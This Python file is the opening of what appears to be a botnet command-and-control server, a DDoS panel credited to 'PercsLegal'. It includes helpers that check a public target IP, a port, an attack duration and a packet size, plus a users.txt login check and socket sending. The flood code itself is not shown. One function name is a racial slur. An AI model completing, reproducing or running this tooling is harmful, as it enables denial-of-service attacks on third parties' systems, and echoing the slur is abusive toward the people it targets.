#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Author: PercsLegal
# Date: 05/26/2021

import socket
import threading
import sys
import time
import ipaddress
import requests
from colorama import Fore, init
from requests.api import request
import os

bots = {}
ansi_clear = '\033[2J\033[H'
my_ip = requests.get("https://api.my-ip.io/ip") 
 

banner = Fore.MAGENTA + '''
PUT BANNER HERE
'''
print(banner)

owner = '''
PUT BANNER HERE
'''

methods = '''

PUT BANNER HERE

'''
help1 = '''
PUT BANNER HERE

'''

L4 = '''
PUT BANNER HERE
'''

VIP = '''
PUT BANNER HERE

'''

credits = '''

[48;2;0;0;0m[38;2;0;0;1m▄[48;2;0;0;0m    [48;2;1;0;0m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;0;0;1m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;1;0;0m[38;2;0;0;0m▄[48;2;0;1;0m[38;2;0;0;0m▄[48;2;0;1;0m[38;2;0;0;0m▄[48;2;0;0;0m[38;2;0;0;1m▄[48;2;0;0;0m [38;2;0;0;1m▄[48;2;0;0;1m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;0;0;1m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;0;1;0m[38;2;0;0;0m▄[48;2;0;0;0m    [48;2;0;0;1m[38;2;0;0;0m▄[48;2;0;0;0m [38;2;0;0;1m▄[48;2;0;0;0m  [38;2;1;0;0m▄[48;2;0;0;0m [48;2;0;1;0m[38;2;1;0;0m▄[48;2;0;0;0m[38;2;0;1;0m▄[48;2;0;0;0m   [48;2;0;1;0m[38;2;0;0;0m▄[48;2;0;0;0m            [38;2;1;0;0m▄[48;2;0;0;0m  [48;2;0;1;0m[38;2;0;0;0m▄[48;2;0;0;0m   [38;2;7;5;5m▄[48;2;0;0;0m[38;2;8;6;6m▄[48;2;0;0;0m[38;2;9;6;6m▄[48;2;0;0;0m[38;2;8;7;7m▄[48;2;0;0;0m[38;2;5;4;5m▄[48;2;0;0;0m[38;2;6;6;6m▄[48;2;0;0;1m[38;2;9;7;7m▄[48;2;0;0;0m[38;2;9;7;7m▄[48;2;0;0;0m[38;2;8;7;7m▄[48;2;11;11;11m[38;2;10;7;7m▄[48;2;8;8;8m[38;2;12;8;12m▄[48;2;7;7;7m[38;2;15;9;18m▄[48;2;8;8;8m[38;2;9;7;7m▄[48;2;13;0;0m[38;2;8;7;8m▄[48;2;9;9;9m[38;2;44;19;71m▄[48;2;9;9;9m[38;2;75;30;125m▄[48;2;9;9;9m[38;2;89;35;151m▄[48;2;9;9;9m[38;2;12;8;12m▄[48;2;0;0;0m  [0m
[48;2;0;1;0m[38;2;0;0;0m▄[48;2;0;0;0m    [38;2;0;1;0m▄[48;2;0;0;0m      [38;2;0;1;0m▄[48;2;0;0;0m     [38;2;1;0;0m▄[48;2;0;0;0m       [38;2;5;5;5m▄[48;2;0;0;0m[38;2;11;7;7m▄[48;2;0;0;0m[38;2;9;7;6m▄[48;2;0;0;0m[38;2;9;7;6m▄[48;2;0;0;0m[38;2;8;7;7m▄[48;2;0;0;0m[38;2;8;7;7m▄[48;2;0;1;0m[38;2;7;7;7m▄[48;2;0;0;0m            [38;2;0;0;1m▄[48;2;0;0;0m  [38;2;0;0;1m▄[48;2;0;0;0m   [48;2;0;0;1m [48;2;0;0;0m      [48;2;8;6;6m[38;2;7;5;5m▄[48;2;22;11;32m[38;2;23;12;34m▄[48;2;75;29;126m[38;2;144;54;248m▄[48;2;76;29;127m[38;2;144;54;248m▄[48;2;80;31;135m[38;2;117;44;200m▄[48;2;8;6;6m[38;2;6;5;5m▄[48;2;9;5;8m[38;2;4;2;2m▄[48;2;97;37;164m[38;2;7;5;5m▄[48;2;141;53;242m[38;2;119;45;204m▄[48;2;144;54;248m [38;2;94;37;160m▄[48;2;144;54;249m[38;2;65;26;107m▄[48;2;144;54;248m[38;2;100;39;170m▄[48;2;144;54;248m[38;2;143;54;247m▄[48;2;31;15;47m[38;2;122;46;209m▄[48;2;17;9;21m[38;2;27;13;39m▄[48;2;144;54;248m [48;2;138;52;237m[38;2;125;47;214m▄[48;2;13;8;14m[38;2;12;8;13m▄[48;2;0;0;0m[38;2;0;0;1m▄[48;2;0;0;0m [0m
[48;2;0;0;0m [38;2;8;8;8m▄[48;2;0;0;0m[38;2;8;6;6m▄[48;2;0;0;0m[38;2;8;6;6m▄[48;2;1;0;0m[38;2;9;7;7m▄[48;2;0;0;0m[38;2;8;6;7m▄[48;2;0;0;0m [38;2;9;6;6m▄[48;2;0;0;0m[38;2;24;11;32m▄[48;2;0;0;0m[38;2;52;21;83m▄[48;2;0;0;0m[38;2;67;27;111m▄[48;2;0;0;0m[38;2;22;10;31m▄[48;2;0;0;0m             [48;2;8;7;6m[38;2;8;5;6m▄[48;2;15;9;18m[38;2;70;28;117m▄[48;2;37;16;58m[38;2;133;50;228m▄[48;2;32;14;48m[38;2;145;54;248m▄[48;2;44;18;70m[38;2;144;54;249m▄[48;2;85;33;144m[38;2;144;54;248m▄[48;2;35;15;54m[38;2;144;54;248m▄[48;2;18;10;23m[38;2;144;54;248m▄[48;2;10;7;9m[38;2;89;34;149m▄[48;2;1;0;0m[38;2;9;7;7m▄[48;2;0;0;0m[38;2;5;5;5m▄[48;2;0;0;0m [38;2;7;7;7m▄[48;2;0;0;0m[38;2;8;7;7m▄[48;2;0;0;0m[38;2;48;20;77m▄[48;2;0;0;0m[38;2;45;19;71m▄[48;2;0;1;0m[38;2;8;6;6m▄[48;2;0;0;0m[38;2;9;6;6m▄[48;2;0;0;0m [38;2;9;9;9m▄[48;2;0;0;0m[38;2;9;7;7m▄[48;2;5;5;5m[38;2;61;25;101m▄[48;2;8;6;6m[38;2;76;30;128m▄[48;2;9;7;8m[38;2;86;33;144m▄[48;2;7;4;4m[38;2;59;24;97m▄[48;2;0;0;0m[38;2;15;9;18m▄[48;2;0;0;0m   [38;2;0;0;1m▄[48;2;0;0;0m    [48;2;8;7;6m[38;2;9;7;7m▄[48;2;9;7;7m[38;2;69;28;115m▄[48;2;144;54;248m [38;2;145;54;248m▄[48;2;118;45;202m[38;2;133;50;227m▄[48;2;8;6;8m[38;2;38;17;60m▄[48;2;0;0;0m [48;2;6;5;5m[38;2;7;6;6m▄[48;2;121;47;207m[38;2;123;47;210m▄[48;2;144;54;248m [48;2;54;23;88m[38;2;54;22;87m▄[48;2;7;5;5m[38;2;1;0;0m▄[48;2;8;6;6m[38;2;6;5;5m▄[48;2;130;49;225m[38;2;131;50;225m▄[48;2;144;54;248m[38;2;142;53;245m▄[48;2;45;20;72m[38;2;50;21;81m▄[48;2;144;54;249m[38;2;144;54;248m▄[48;2;134;50;230m[38;2;124;47;213m▄[48;2;12;9;14m[38;2;12;8;13m▄[48;2;0;0;0m  [0m
[48;2;0;0;0m [48;2;8;6;6m[38;2;7;4;4m▄[48;2;111;42;189m[38;2;12;8;12m▄[48;2;132;49;227m[38;2;122;46;213m▄[48;2;138;52;236m[38;2;144;54;248m▄[48;2;30;13;45m[38;2;78;30;130m▄[48;2;5;5;5m[38;2;5;3;3m▄[48;2;15;9;17m[38;2;21;11;29m▄[48;2;106;40;181m[38;2;142;53;244m▄[48;2;142;53;244m[38;2;141;52;242m▄[48;2;78;31;131m[38;2;7;6;7m▄[48;2;8;7;9m[38;2;6;5;5m▄[48;2;0;0;1m[38;2;36;16;54m▄[48;2;6;3;3m[38;2;64;26;106m▄[48;2;8;6;6m[38;2;64;26;106m▄[48;2;0;0;0m[38;2;45;19;71m▄[48;2;0;0;0m[38;2;11;6;10m▄[48;2;0;0;0m[38;2;0;0;1m▄[48;2;0;0;0m[38;2;8;8;8m▄[48;2;0;0;0m[38;2;11;7;11m▄[48;2;8;6;7m[38;2;86;34;145m▄[48;2;9;7;7m[38;2;135;51;233m▄[48;2;9;7;7m[38;2;140;53;242m▄[48;2;9;6;6m[38;2;88;35;149m▄[48;2;0;0;0m[38;2;14;8;17m▄[48;2;1;0;0m[38;2;5;2;2m▄[48;2;8;4;5m[38;2;5;4;4m▄[48;2;67;27;110m[38;2;56;23;90m▄[48;2;144;54;248m[38;2;144;55;249m▄[48;2;96;37;163m[38;2;60;24;99m▄[48;2;16;9;20m[38;2;7;4;4m▄[48;2;103;39;175m[38;2;7;5;5m▄[48;2;144;54;248m[38;2;81;32;137m▄[48;2;144;54;248m[38;2;144;54;247m▄[48;2;91;36;154m[38;2;125;47;214m▄[48;2;7;5;5m[38;2;27;12;41m▄[48;2;0;0;0m[38;2;11;7;12m▄[48;2;15;9;19m[38;2;100;39;170m▄[48;2;124;47;212m[38;2;144;54;248m▄[48;2;140;53;243m[38;2;86;34;144m▄[48;2;141;53;243m[38;2;94;36;160m▄[48;2;127;48;217m[38;2;144;54;248m▄[48;2;24;12;36m[38;2;98;38;166m▄[48;2;0;0;0m[38;2;10;7;10m▄[48;2;8;6;6m[38;2;35;16;53m▄[48;2;62;25;103m[38;2;129;49;222m▄[48;2;143;53;245m[38;2;123;47;211m▄[48;2;144;54;248m[38;2;22;11;31m▄[48;2;144;54;248m[38;2;15;9;18m▄[48;2;142;53;245m[38;2;139;52;238m▄[48;2;32;15;48m[38;2;138;52;238m▄[48;2;8;5;5m[38;2;11;8;11m▄[48;2;0;1;0m[38;2;36;16;57m▄[48;2;0;0;0m[38;2;49;20;78m▄[48;2;0;0;0m[38;2;58;24;94m▄[48;2;0;1;0m[38;2;63;26;103m▄[48;2;0;0;0m[38;2;64;26;105m▄[48;2;0;0;0m[38;2;55;23;90m▄[48;2;0;0;0m[38;2;8;7;7m▄[48;2;8;6;6m[38;2;22;11;32m▄[48;2;138;52;237m[38;2;138;52;239m▄[48;2;144;54;248m[38;2;121;46;207m▄[48;2;144;54;248m[38;2;119;45;204m▄[48;2;144;54;248m[38;2;144;54;249m▄[48;2;62;25;101m[38;2;64;26;105m▄[48;2;0;0;0m[38;2;4;3;3m▄[48;2;7;5;5m[38;2;7;4;4m▄[48;2;120;45;206m[38;2;123;47;210m▄[48;2;144;54;248m [48;2;54;23;87m[38;2;91;35;153m▄[48;2;8;6;6m[38;2;73;29;122m▄[48;2;22;11;34m[38;2;122;46;209m▄[48;2;134;50;231m[38;2;144;54;248m▄[48;2;132;50;227m[38;2;70;28;117m▄[48;2;67;27;111m[38;2;36;16;56m▄[48;2;144;54;248m [48;2;123;46;211m[38;2;100;38;170m▄[48;2;12;8;12m[38;2;10;7;10m▄[48;2;0;0;0m  [0m
[48;2;0;0;0m [48;2;0;0;1m[38;2;0;0;0m▄[48;2;6;5;5m[38;2;0;0;0m▄[48;2;74;30;123m[38;2;63;26;104m▄[48;2;144;54;248m[38;2;142;53;245m▄[48;2;107;40;182m[38;2;108;41;183m▄[48;2;6;5;5m[38;2;9;7;7m▄[48;2;22;11;30m[38;2;78;31;131m▄[48;2;144;54;248m[38;2;144;54;249m▄[48;2;87;35;147m[38;2;20;11;27m▄[48;2;8;7;6m[38;2;24;11;33m▄[48;2;29;14;44m[38;2;121;46;207m▄[48;2;134;51;231m [48;2;144;54;248m[38;2;42;18;66m▄[48;2;144;54;248m[38;2;23;11;30m▄[48;2;138;52;236m[38;2;141;53;243m▄[48;2;32;15;49m[38;2;135;50;233m▄[48;2;9;6;6m[38;2;9;7;7m▄[48;2;8;6;6m[38;2;42;18;67m▄[48;2;113;43;194m[38;2;144;54;248m▄[48;2;144;54;247m[38;2;98;38;166m▄[48;2;71;28;118m[38;2;12;7;15m▄[48;2;75;30;125m[38;2;20;10;28m▄[48;2;144;54;248m[38;2;116;44;198m▄[48;2;114;43;195m[38;2;137;52;236m▄[48;2;8;6;6m[38;2;43;19;68m▄[48;2;6;6;6m[38;2;7;6;6m▄[48;2;59;24;96m[38;2;66;26;109m▄[48;2;144;54;248m [48;2;81;32;137m[38;2;48;20;78m▄[48;2;4;4;4m[38;2;5;5;5m▄[48;2;2;0;0m[38;2;0;0;0m▄[48;2;29;14;43m[38;2;26;12;39m▄[48;2;129;49;221m[38;2;127;48;218m▄[48;2;138;52;239m[38;2;141;53;242m▄[48;2;49;21;79m[38;2;52;22;84m▄[48;2;26;13;38m[38;2;117;44;200m▄[48;2;144;54;246m[38;2;140;53;242m▄[48;2;75;29;125m[38;2;24;12;34m▄[48;2;7;5;5m[38;2;1;1;1m▄[48;2;10;6;11m[38;2;7;6;6m▄[48;2;144;54;248m[38;2;108;41;185m▄[48;2;142;53;247m[38;2;144;54;248m▄[48;2;16;9;20m[38;2;17;10;21m▄[48;2;61;25;100m[38;2;95;37;161m▄[48;2;144;54;248m [48;2;55;22;90m[38;2;8;6;6m▄[48;2;4;4;4m[38;2;2;2;2m▄[48;2;10;7;8m[38;2;5;4;4m▄[48;2;107;41;183m[38;2;71;28;119m▄[48;2;144;54;248m[38;2;144;54;249m▄[48;2;44;18;71m[38;2;68;27;113m▄[48;2;130;48;222m[38;2;47;20;74m▄[48;2;139;52;239m[38;2;9;7;8m▄[48;2;142;53;244m[38;2;17;9;22m▄[48;2;144;54;247m[38;2;6;5;5m▄[48;2;140;53;242m[38;2;7;5;5m▄[48;2;134;50;230m[38;2;7;5;5m▄[48;2;9;6;7m[38;2;9;7;7m▄[48;2;71;28;117m[38;2;83;33;140m▄[48;2;143;54;246m[38;2;144;54;248m▄[48;2;96;37;162m[38;2;110;42;188m▄[48;2;21;11;29m[38;2;70;28;117m▄[48;2;144;54;249m[38;2;144;54;248m▄[48;2;76;30;126m[38;2;141;53;243m▄[48;2;8;7;7m[38;2;11;8;11m▄[48;2;7;6;6m[38;2;9;6;8m▄[48;2;122;46;210m[38;2;122;47;211m▄[48;2;144;54;248m[38;2;140;52;240m▄[48;2;144;54;248m[38;2;48;20;77m▄[48;2;144;54;248m[38;2;7;5;5m▄[48;2;144;54;248m[38;2;6;5;4m▄[48;2;58;23;95m[38;2;7;6;6m▄[48;2;11;8;11m[38;2;4;2;2m▄[48;2;61;25;101m[38;2;69;27;115m▄[48;2;144;54;248m [48;2;90;35;152m[38;2;84;33;141m▄[48;2;8;7;8m[38;2;8;4;7m▄[48;2;0;0;0m  [0m
[48;2;0;0;0m   [48;2;38;16;61m[38;2;25;7;41m▄[48;2;135;50;230m[38;2;111;15;223m▄[48;2;113;43;192m[38;2;110;14;220m▄[48;2;15;9;18m[38;2;37;9;66m▄[48;2;140;52;240m[38;2;123;15;247m▄[48;2;138;52;237m[38;2;89;12;175m▄[48;2;19;10;25m[38;2;13;7;15m▄[48;2;54;22;87m[38;2;66;10;128m▄[48;2;144;54;247m[38;2;123;15;247m▄[48;2;76;30;127m[38;2;8;7;7m▄[48;2;5;3;3m[38;2;3;3;3m▄[48;2;9;7;7m[38;2;5;4;4m▄[48;2;111;43;190m[38;2;56;12;104m▄[48;2;144;54;248m[38;2;125;20;247m▄[48;2;15;9;18m[38;2;48;10;88m▄[48;2;94;36;158m[38;2;85;16;160m▄[48;2;142;53;245m[38;2;122;22;237m▄[48;2;59;24;96m[38;2;11;6;12m▄[48;2;3;1;1m[38;2;3;2;2m▄[48;2;7;4;4m[38;2;6;4;4m▄[48;2;101;39;172m[38;2;91;20;171m▄[48;2;143;53;245m[38;2;129;27;247m▄[48;2;67;27;111m[38;2;66;16;121m▄[48;2;7;5;5m[38;2;8;6;6m▄[48;2;83;33;140m[38;2;81;20;150m▄[48;2;144;54;248m[38;2;131;29;247m▄[48;2;63;25;105m[38;2;31;11;51m▄[48;2;7;5;5m[38;2;5;3;3m▄[48;2;0;0;0m [48;2;39;17;60m[38;2;45;13;78m▄[48;2;133;50;228m[38;2;125;29;235m▄[48;2;138;52;238m[38;2;111;27;207m▄[48;2;48;21;78m[38;2;21;10;31m▄[48;2;142;53;245m[38;2;132;31;247m▄[48;2;124;47;214m[38;2;116;29;217m▄[48;2;20;11;27m[38;2;19;9;27m▄[48;2;0;0;0m [48;2;7;5;5m[38;2;8;7;7m▄[48;2;68;28;115m[38;2;89;21;166m▄[48;2;144;54;248m[38;2;130;31;245m▄[48;2;17;10;21m[38;2;16;8;20m▄[48;2;136;51;234m[38;2;119;29;223m▄[48;2;143;53;246m[38;2;130;30;245m▄[48;2;8;7;7m[38;2;8;6;7m▄[48;2;0;0;0m [48;2;6;5;5m[38;2;9;5;7m▄[48;2;68;27;112m[38;2;77;18;143m▄[48;2;144;54;249m[38;2;130;29;246m▄[48;2;36;15;56m[38;2;8;6;6m▄[48;2;5;4;4m[38;2;2;2;2m▄[48;2;1;1;1m[38;2;0;0;0m▄[48;2;2;2;2m[38;2;0;0;0m▄[48;2;0;0;0m [48;2;1;1;0m[38;2;0;0;0m▄[48;2;0;0;0m[38;2;4;4;4m▄[48;2;15;9;18m[38;2;24;9;38m▄[48;2;104;40;176m[38;2;124;22;242m▄[48;2;144;54;248m[38;2;127;22;247m▄[48;2;144;54;248m[38;2;8;6;7m▄[48;2;144;54;248m[38;2;8;6;6m▄[48;2;144;54;248m[38;2;86;15;165m▄[48;2;144;54;248m[38;2;125;18;247m▄[48;2;17;10;22m[38;2;46;9;84m▄[48;2;13;7;14m[38;2;19;7;28m▄[48;2;125;47;213m[38;2;109;14;217m▄[48;2;130;49;223m[38;2;105;14;209m▄[48;2;36;16;55m[38;2;23;8;38m▄[48;2;1;0;0m[38;2;0;0;0m▄[48;2;0;0;0m [38;2;0;0;1m▄[48;2;5;3;3m[38;2;7;5;5m▄[48;2;84;33;143m[38;2;77;11;152m▄[48;2;144;54;248m[38;2;123;15;247m▄[48;2;75;30;125m[38;2;60;10;115m▄[48;2;7;6;6m[38;2;7;5;5m▄[48;2;0;0;0m  [0m
[48;2;0;0;0m   [48;2;7;6;6m[38;2;7;5;5m▄[48;2;107;14;212m[38;2;100;13;200m▄[48;2;122;15;245m[38;2;123;15;247m▄[48;2;97;12;194m[38;2;123;15;247m▄[48;2;123;15;247m[38;2;121;15;244m▄[48;2;68;11;132m[38;2;57;10;109m▄[48;2;10;7;8m[38;2;9;7;7m▄[48;2;110;13;220m[38;2;114;14;229m▄[48;2;122;14;245m[38;2;122;14;244m▄[48;2;9;6;6m[38;2;9;7;7m▄[48;2;1;0;0m[38;2;0;0;0m▄[48;2;5;3;3m[38;2;6;5;5m▄[48;2;54;10;102m[38;2;61;10;116m▄[48;2;123;15;247m [48;2;45;9;84m[38;2;13;7;15m▄[48;2;86;12;170m[38;2;87;12;173m▄[48;2;118;15;237m [48;2;9;5;9m[38;2;12;6;14m▄[48;2;3;0;0m [48;2;7;4;5m[38;2;11;6;12m▄[48;2;87;12;172m[38;2;91;13;179m▄[48;2;121;14;242m[38;2;114;14;228m▄[48;2;53;10;101m[38;2;25;7;41m▄[48;2;9;6;6m[38;2;8;6;6m▄[48;2;71;11;138m[38;2;82;11;162m▄[48;2;123;15;247m [48;2;17;7;26m[38;2;14;7;18m▄[48;2;4;4;5m[38;2;7;6;6m▄[48;2;8;5;5m[38;2;21;8;32m▄[48;2;58;10;111m[38;2;120;14;242m▄[48;2;123;15;247m[38;2;122;15;247m▄[48;2;96;13;192m[38;2;33;8;59m▄[48;2;9;7;8m[38;2;8;6;6m▄[48;2;117;14;236m[38;2;88;12;173m▄[48;2;110;14;220m[38;2;123;15;247m▄[48;2;19;7;28m[38;2;31;8;55m▄[48;2;3;0;0m[38;2;9;7;8m▄[48;2;8;6;7m[38;2;41;9;74m▄[48;2;115;14;230m[38;2;123;15;246m▄[48;2;101;13;201m[38;2;65;11;125m▄[48;2;13;7;15m[38;2;8;7;6m▄[48;2;80;12;158m[38;2;48;11;90m▄[48;2;123;15;247m[38;2;122;15;246m▄[48;2;16;6;23m[38;2;101;13;201m▄[48;2;7;4;4m[38;2;24;8;40m▄[48;2;10;7;9m[38;2;94;12;187m▄[48;2;118;15;237m[38;2;118;14;237m▄[48;2;113;14;226m[38;2;26;8;43m▄[48;2;8;6;6m[38;2;7;5;5m▄[48;2;0;0;0m  [48;2;0;1;0m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;9;6;6m[38;2;9;7;7m▄[48;2;29;8;51m[38;2;122;15;246m▄[48;2;123;15;247m [48;2;65;10;128m[38;2;15;7;20m▄[48;2;7;6;6m[38;2;4;1;1m▄[48;2;5;4;4m[38;2;8;6;8m▄[48;2;35;9;62m[38;2;44;9;81m▄[48;2;123;15;247m[38;2;123;15;246m▄[48;2;111;13;223m[38;2;119;15;239m▄[48;2;25;8;41m[38;2;55;10;105m▄[48;2;111;14;222m[38;2;121;15;243m▄[48;2;103;13;206m[38;2;100;13;199m▄[48;2;21;7;33m[38;2;17;6;26m▄[48;2;0;0;0m  [38;2;6;6;6m▄[48;2;13;7;15m[38;2;35;9;63m▄[48;2;94;13;186m[38;2;85;12;168m▄[48;2;123;15;247m[38;2;79;11;155m▄[48;2;61;11;117m[38;2;40;9;74m▄[48;2;5;4;4m[38;2;1;0;1m▄[48;2;0;0;0m  [0m
[48;2;0;0;0m   [48;2;6;6;6m[38;2;6;3;3m▄[48;2;41;9;76m[38;2;9;6;10m▄[48;2;123;15;247m [48;2;123;14;247m[38;2;122;15;247m▄[48;2;114;14;228m[38;2;112;14;225m▄[48;2;16;6;24m[38;2;7;4;5m▄[48;2;8;6;6m[38;2;5;4;4m▄[48;2;81;11;159m[38;2;47;10;88m▄[48;2;123;15;247m [48;2;11;6;12m[38;2;98;13;195m▄[48;2;5;4;5m[38;2;14;7;17m▄[48;2;9;7;7m[38;2;53;9;100m▄[48;2;112;14;224m[38;2;122;15;245m▄[48;2;120;14;241m[38;2;32;9;55m▄[48;2;9;7;7m[38;2;8;6;6m▄[48;2;81;12;158m[38;2;77;11;149m▄[48;2;122;15;244m[38;2;123;15;247m▄[48;2;54;10;101m[38;2;120;15;240m▄[48;2;8;7;7m[38;2;62;10;119m▄[48;2;34;8;61m[38;2;122;14;245m▄[48;2;116;14;232m[38;2;119;14;239m▄[48;2;110;14;220m[38;2;9;7;7m▄[48;2;6;4;5m[38;2;9;7;8m▄[48;2;8;6;6m[38;2;26;7;42m▄[48;2;112;14;224m[38;2;123;15;247m▄[48;2;123;15;247m [48;2;20;7;31m[38;2;123;14;247m▄[48;2;65;10;125m[38;2;123;15;247m▄[48;2;111;14;223m[38;2;119;15;239m▄[48;2;123;15;246m[38;2;76;11;148m▄[48;2;69;11;133m[38;2;9;6;9m▄[48;2;7;6;6m[38;2;0;0;0m▄[48;2;5;3;3m[38;2;0;0;0m▄[48;2;26;8;44m[38;2;6;5;5m▄[48;2;117;14;235m[38;2;59;10;112m▄[48;2;108;14;215m[38;2;117;15;234m▄[48;2;78;12;151m[38;2;117;14;236m▄[48;2;111;14;221m[38;2;115;14;231m▄[48;2;108;14;216m[38;2;9;7;7m▄[48;2;24;7;41m[38;2;4;4;4m▄[48;2;3;1;1m[38;2;0;0;0m▄[48;2;22;7;36m[38;2;4;3;3m▄[48;2;102;13;203m[38;2;8;6;6m▄[48;2;122;15;247m[38;2;23;8;36m▄[48;2;123;15;246m[38;2;52;10;100m▄[48;2;123;15;246m[38;2;9;7;7m▄[48;2;59;10;114m[38;2;6;4;5m▄[48;2;8;4;10m[38;2;0;0;1m▄[48;2;1;0;1m[38;2;0;0;0m▄[48;2;1;0;0m [48;2;0;0;0m   [48;2;7;6;7m[38;2;11;7;10m▄[48;2;42;9;79m[38;2;90;13;178m▄[48;2;123;15;247m[38;2;89;12;176m▄[48;2;87;12;172m[38;2;9;7;7m▄[48;2;11;7;11m[38;2;0;0;0m▄[48;2;3;3;3m[38;2;2;2;2m▄[48;2;12;7;13m[38;2;5;2;2m▄[48;2;53;10;101m[38;2;0;0;0m▄[48;2;54;10;103m[38;2;0;0;0m▄[48;2;50;11;95m[38;2;1;0;0m▄[48;2;63;10;122m[38;2;55;10;105m▄[48;2;122;15;245m[38;2;97;12;194m▄[48;2;49;9;92m[38;2;8;5;5m▄[48;2;5;4;5m[38;2;0;0;0m▄[48;2;0;1;0m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;4;4;4m[38;2;0;0;0m▄[48;2;5;4;4m[38;2;0;0;0m▄[48;2;4;4;4m[38;2;0;0;0m▄[48;2;4;5;4m[38;2;0;0;0m▄[48;2;0;0;0m   [0m
[48;2;0;0;0m   [48;2;4;4;4m[38;2;8;6;6m▄[48;2;13;6;15m[38;2;21;8;34m▄[48;2;123;14;247m[38;2;123;15;247m▄[48;2;123;15;247m [48;2;84;11;165m[38;2;30;7;51m▄[48;2;5;4;4m[38;2;6;4;4m▄[48;2;0;0;1m[38;2;0;0;0m▄[48;2;27;8;45m[38;2;5;5;5m▄[48;2;108;14;215m[38;2;15;7;20m▄[48;2;122;15;245m[38;2;38;8;69m▄[48;2;117;14;236m[38;2;98;12;194m▄[48;2;123;15;247m[38;2;22;7;35m▄[48;2;89;12;176m[38;2;11;7;12m▄[48;2;15;6;22m[38;2;3;1;1m▄[48;2;1;1;1m[38;2;0;0;0m▄[48;2;8;7;7m[38;2;0;0;0m▄[48;2;67;11;129m[38;2;8;6;6m▄[48;2;105;12;210m[38;2;13;7;14m▄[48;2;123;15;247m[38;2;14;7;18m▄[48;2;102;13;203m[38;2;12;7;14m▄[48;2;28;8;47m[38;2;4;2;4m▄[48;2;11;7;11m[38;2;3;3;3m▄[48;2;46;9;85m[38;2;12;7;12m▄[48;2;68;11;132m[38;2;9;6;7m▄[48;2;68;11;132m[38;2;7;5;6m▄[48;2;67;11;129m[38;2;6;5;5m▄[48;2;66;11;127m[38;2;1;0;0m▄[48;2;66;11;127m[38;2;0;0;0m▄[48;2;27;8;46m[38;2;0;0;0m▄[48;2;7;5;5m[38;2;0;0;0m▄[48;2;1;1;1m[38;2;0;0;0m▄[48;2;0;0;0m[38;2;1;0;0m▄[48;2;0;0;0m  [48;2;5;4;4m[38;2;0;0;0m▄[48;2;6;5;5m[38;2;0;0;0m▄[48;2;8;6;7m[38;2;0;0;0m▄[48;2;6;5;5m[38;2;0;0;0m▄[48;2;5;4;4m[38;2;0;0;0m▄[48;2;0;0;0m [38;2;0;1;1m▄[48;2;0;0;0m  [48;2;4;5;5m[38;2;0;0;0m▄[48;2;5;4;4m[38;2;0;0;0m▄[48;2;4;3;3m[38;2;0;0;0m▄[48;2;0;0;0m [48;2;1;0;0m[38;2;0;0;0m▄[48;2;0;0;0m [38;2;0;1;0m▄[48;2;0;0;0m  [48;2;7;6;6m[38;2;8;6;7m▄[48;2;35;9;63m[38;2;14;7;18m▄[48;2;45;9;82m[38;2;3;2;2m▄[48;2;6;5;5m[38;2;0;0;0m▄[48;2;3;1;0m[38;2;0;0;0m▄[48;2;0;0;0m [38;2;1;0;0m▄[48;2;0;0;0m    [48;2;58;10;110m[38;2;10;7;12m▄[48;2;27;8;44m[38;2;10;7;9m▄[48;2;4;3;3m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;0;0;1m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;0;1;0m[38;2;1;0;0m▄[48;2;0;0;0m [38;2;0;0;1m▄[48;2;1;0;0m[38;2;0;1;0m▄[48;2;0;0;0m [48;2;1;0;0m[38;2;0;0;0m▄[0m
[48;2;0;0;0m   [48;2;14;5;19m[38;2;3;0;0m▄[48;2;51;9;95m[38;2;2;2;2m▄[48;2;39;9;71m[38;2;1;1;1m▄[48;2;10;6;11m[38;2;2;2;2m▄[48;2;6;4;4m[38;2;0;0;0m▄[48;2;2;2;2m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;2;2;2m[38;2;0;0;0m▄[48;2;6;5;5m[38;2;0;0;0m▄[48;2;6;5;5m[38;2;0;0;0m▄[48;2;6;5;5m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;0;0;1m[38;2;0;0;0m▄[48;2;0;0;0m [48;2;1;0;0m[38;2;0;0;0m▄[48;2;0;0;0m [48;2;1;0;0m[38;2;0;0;0m▄[48;2;0;0;0m   [38;2;0;0;1m▄[48;2;0;0;0m    [38;2;1;0;0m▄[48;2;0;0;0m  [48;2;0;0;1m[38;2;0;0;0m▄[48;2;0;0;0m [48;2;0;0;1m[38;2;0;0;0m▄[48;2;0;0;0m   [38;2;0;0;1m▄[48;2;0;0;0m  [38;2;0;1;0m▄[48;2;0;0;0m    [48;2;1;0;0m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;0;0;1m[38;2;0;0;0m▄[48;2;0;0;0m  [48;2;1;0;0m[38;2;0;0;0m▄[48;2;0;0;0m [48;2;3;0;0m[38;2;0;0;0m▄[48;2;3;1;1m[38;2;0;0;0m▄[48;2;0;0;0m      [38;2;0;0;1m▄[48;2;0;0;0m  [38;2;0;1;0m▄[48;2;0;0;0m    [48;2;0;1;0m[38;2;0;0;0m▄[48;2;0;0;0m[38;2;0;1;0m▄[48;2;0;0;0m       [0m
[48;2;0;0;0m 
================================
Odiare Was Coded For N.
Coded By ➤ PercsLegal | VooDoo API Founder | Chloe API Founder
PUT CNC NAME HERE Is 2,000 Lines Of Python3

'''
         
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1200

def hold_nigga(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 84000

def httpsreq(time):
    pass

def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500


def find_login(username, password):
    credentials = [x.strip() for x in open('users.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

